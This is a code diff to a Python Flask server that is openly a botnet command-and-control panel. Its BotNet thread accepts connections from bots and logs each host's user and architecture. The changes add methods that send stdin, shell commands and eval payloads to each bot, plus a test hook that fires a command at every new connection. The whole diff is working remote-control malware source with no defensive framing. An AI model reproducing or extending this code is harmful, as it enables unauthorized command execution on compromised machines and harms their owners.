@@ -5,6 +5,12 @@ from threading import Thread
 from flask import Flask, render_template, session, request
 from flask_socketio import SocketIO, emit
 
+# Loading library depends on how we want to setup the project later,
+# for now this will do
+try: from server import byteutils
+except: import byteutils
+
+
 ''' Sumner: if you are reading this I have only just got the main concept working,
 Looks pretty dope though so far.
 
@@ -49,7 +55,7 @@ def send_receive(cmd):
 def bot_selector():
     select = request.form.get('bot')
     connected = str(select)
-    print connected
+    print(connected)
 
 class BotNet(Thread):
     def __init__(self, tcpsock):
@@ -57,12 +63,16 @@ class BotNet(Thread):
         self.tcpsock = tcpsock
 
     def run(self):
-        while 1:
+        while True:
             self.tcpsock.listen(5)
             (clientsock, (ip, port)) = self.tcpsock.accept()
-            host_info = json.loads(recv_timeout(clientsock))
-            print "[+] Recieved connection from {}".format(host_info['user'])
+            msgbytes = byteutils.recvFormatBytes(clientsock)
+            host_info = json.loads(msgbytes.decode('UTF-8'))
+            print("[+] Recieved connection from {}".format(host_info['user']))
             allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)
+
+            # Testing: automatically sends "say hi" command
+            allConnections[host_info['user'][:-1]].sendStdin('say hi\n')
 
 
 # TODO: can make this multi-threaded if want to send to multiple clients at once
@@ -72,42 +82,20 @@ class Bot:
         self.arch = host_info['arch']
         self.user = host_info['user']
 
-    def send(self, cmd):
-        cmd += '\n'
-        totalsent = 0
-        while totalsent < len(cmd):
-            sent = self.sock.send(cmd[totalsent:])
-            if sent == 0:
-                raise RuntimeError("[-] Lost connection to {}".format(self.user))
-            totalsent = totalsent + sent
+    def sendStdin(self, cmd):
+        json_str = json.dumps(dict(stdin=cmd))
+        json_format = byteutils.formatBytes(json_str)
+        self.sock.sendall(json_format)
 
-        response = recv_timeout(self.sock)
-        return response
+    def sendCmd(self, cmd):
+        json_str = json.dumps(dict(cmd=cmd))
+        json_format = byteutils.formatBytes(json_str)
+        self.sock.sendall(json_format)
 
-
-# TODO: timeout is not necessarily optimal recv method
-def recv_timeout(socket, timeout=.2):
-    socket.setblocking(0)
-    total_data = [];
-    begin = time.time()
-    while 1:
-        # if you got some data, then break after wait sec
-        if total_data and time.time() - begin > timeout:
-            break
-        # if you got no data at all, wait a little longer
-        elif time.time() - begin > timeout * 2:
-            break
-        try:
-            data = socket.recv(8192)
-            if data:
-                total_data.append(data)
-                begin = time.time()
-            else:
-                time.sleep(0.05)
-        except:
-            pass
-    return ''.join(total_data)
-
+    def sendEval(self, cmd):
+        json_str = json.dumps(dict(eval=cmd))
+        json_format = byteutils.formatBytes(json_str)
+        self.sock.sendall(json_format)
 
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
